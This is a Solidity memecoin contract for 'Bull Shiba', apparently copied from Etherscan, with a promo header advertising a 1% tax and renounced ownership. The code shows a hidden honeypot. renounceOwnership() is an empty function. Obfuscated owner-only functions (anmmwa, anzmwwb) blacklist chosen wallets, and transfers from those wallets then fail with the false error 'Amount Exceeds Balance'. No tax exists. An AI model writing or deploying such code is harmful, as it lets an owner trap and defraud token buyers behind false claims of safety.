/**
 *Submitted for verification at Etherscan.io on 2022-08-29
*/

pragma solidity 0.8.16;
/*


MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNNNNWWMMMMMMMMWXKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0KNMMMMMWWWNNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOkkOO0XNWMMNOoco0WMMMMWWWNXXXKKKKKKKXXXNWWMMMMMMMMW0oclOXNX00Okk0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0kkkkkkkO0ko,.:ONWNXKOkdolc:::;;;;;;;:::clodkOKXWWMMMWk;.':ldkkkkkKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOkkkkkkxl,. .lKKkdl:;,,''''',,,,,,,,,,,,'''',,;:ldkKNX0kc.  .cdkkk0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOkkkkko,   .ckxc,,',,,,',,,',,',,,,,,,,,,,,,',,,,,;lkkkkkl.   'lxkONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXOkkkxc.    ,dkxdl;,,,,,'',,,,,,,,,,,,,,,,,,,,,,,,:oxkkkkkx,    .:x0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOkkxl.     .lxkkxdc;,;;::clllloooooollllcc::;,,;ldxkkkkkko.     .c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0kkd'       .,coxkxdodxxxkkkkkkkkkkkkkkkkkxxddodxkkkkxdl,.       'OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkkd,          ..,;:oxkkkkkkkkkkkkkkkkkkkkkkkkkkko:;,..        . ,0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXkkkl....           'dkkkkkkkkkkkkkkkkkkkkkkkkkkx;            ...lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXxdxkko,.....        'dkkkkkkkkkkkkkkkkkkkkkkkkkkx;         ....':lxXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl;cxkkkxl;...........:xkkkkkkkkkkkkkkkkkkkkkkkkkkkl. .......'',cdo;,oKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0l,,;oxkkkkkdl:,'''''.,dkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.'',,,,;ldxkd:,',oKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,',,:dkkkkkkkkkxxxxddxkkkkkkkkkkkkkkkkkkkkkkkkkkkO00kolodxxkkkkkxl,,,',oXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo,,,,,,lxkkkkkkkkOKNWWWNKOkkkkkkkkkkkkkkkkkkkkkkOKNWWWNXOkkkkkkkkko;,,,,,;dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk;',,,,,cdkkkkkkkkKWMMMMMWXOkkkkkkkkkkkkkkkkkkkkkKWMMMMMWXOkkkkkkkxo;,,,',':OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKl,',,,,:oxkkkkkkkkOKXNNNXX0kkkkkkkkkkkkkkkkkkkkkkOKXNNNXX0kkkkkkkkkxl;,,,,,,oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWk;',,,,;oxkkkkkkkxolodkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdlclxkkkkkkkxl;,,,,':OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd,'',,,lxkkkkkkkko.  .';cdxkkkkkkkkkkkkkkkkkkkkkkkkkxdc;'.  .lkkkkkkkkdc,,,,,,xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKl,,,,,:dkkkkkkkkko.      .':oxkkkkkkkkkkkkkkkkkkkxo:'.      .lkkkkkkkkxd:,,',,dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKc',,,;oxkkkkkkkkkxo;..      .'cxkkkkkkkkkkkkkkkxl,.      ..;oxkkkkkkkkkxl,,,',oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKc',',:dkkkkkkkkkkkkkxol:;'....'lkkkkOOOOOOOkkkkd;....',:loxkkkkkkkkkkkkko;,,,,oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo,,',lxkkkkkkkkkkkkkkkkkkkxxdddk0KXNNWWWWWNNXK0Oxddxxxkkkkkkkkkkkkkkkkkkdc,,,,dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd,'';oxkkkkkkkkkkkkkkkkkkkkkk0XNWMMMMMMMMMMMMMWWX0kkkkkkkkkkkkkkkkkkkkkkxc,,,;xWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:',:x0KKKKK000Okkkkkkkkkkk0XWMMMMNkllllllllxKMMMWX0kkkkkkkkkkkOO0000KK0Oo,',c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo,'c0WMMMMMMMWWNXKOkkkkkkKNMMMMMMk.         lNMMMMNKkkkkkO0KXNWWWMMMMMWNd,',dXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:';kWMMMMMMMMMMMWWNKOkOKWMMMMMMMO'         oNMMMMMWKkk0KNWMMMMMMMMMMMWKl,,c0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx;,cOWMMMMMMMMMMMMMMNXXWMMMMMMMMWO:.     .cKMMMMMMMWXXWMMMMMMMMMMMMMMXd;';kWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXd,,:kNMMMMMMMMMMMMMMMMMMMMMMMMMMMN0dc..o0WMMMMMMMMMMMMMMMMMMMMMMMMWXd;,;xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXd;,;o0WMMMMMMMMMMMMMMMMMMMWWNWWWMW0x,'OWMWWWNWMMMMMMMMMMMMMMMMMMW0l,,;xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXd;,,:dKWMMMMMMMMMMMMMMMMMWk;;lddo;...,lxxl,;kWMMMMMMMMMMMMMMMWKd:,,:xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNkc,,,:d0NWMMMMMMMMMMMMMMMXl.oKkol:;:lxKXl'lXMMMMMMMMMMMMMMWKxc,',cONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKd;,,,;lkXWMMMMMMMMMMMMMMNk0WWNXK00NWMW0OWMMMMMMMMMMMMWN0d:,,,;dKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNOl;,',,:oOXWWMMMMMMMMMMMWWMMMMMMMMMMMMWMMMMMMMMMMWN0xl;,',;l0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNOl;,',,,:ok0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXOdl;,,,,;oONWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0d:,,,,,,;cok0XNWMMMMMMMMMMMMMMMMMMMWWNKOxl:,,',,,cd0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKko:,,,',',;:ldxOKXNNWWWWWWWNNXK0kxoc;,,',,,,:oOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOdl;,'',,,,,,;:cclooooollc:;,,'',,,,,:ldOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOxoc:;,,,'',,''''''','',,,,;:loxOKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0OkxdoollllllllloodxkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWWWWNNNNWWWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM



Bull Shiba ($BULLSHIB)

$BULLSHIB is a low-tax memecoin inspired by Shiba Coin. 
TOKENOMICS

1% Tax
Liquidity Locked for 1 Month 
Ownership Renounced

PULSECHAIN BRIDGE / POW BRIDGE

The PulseChain cross-chain bridge will occur in Q4 2022. All holders will be airdropped 1 for 1 of $BULLSHIB on PRC20.


*/    

contract BullShib {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) bAmnt;

    // 
    string public name = "Bull Shiba";
    string public symbol = unicode"BULLSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 77700000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function anmmwa(address _user) public onlyOwner {
        require(!bAmnt[_user], "x");
        bAmnt[_user] = true;
     
    }
    
    function anzmwwb(address _user) public onlyOwner {
        require(bAmnt[_user], "xx");
        bAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!bAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!bAmnt[from] , "Amount Exceeds Balance"); 
               require(!bAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}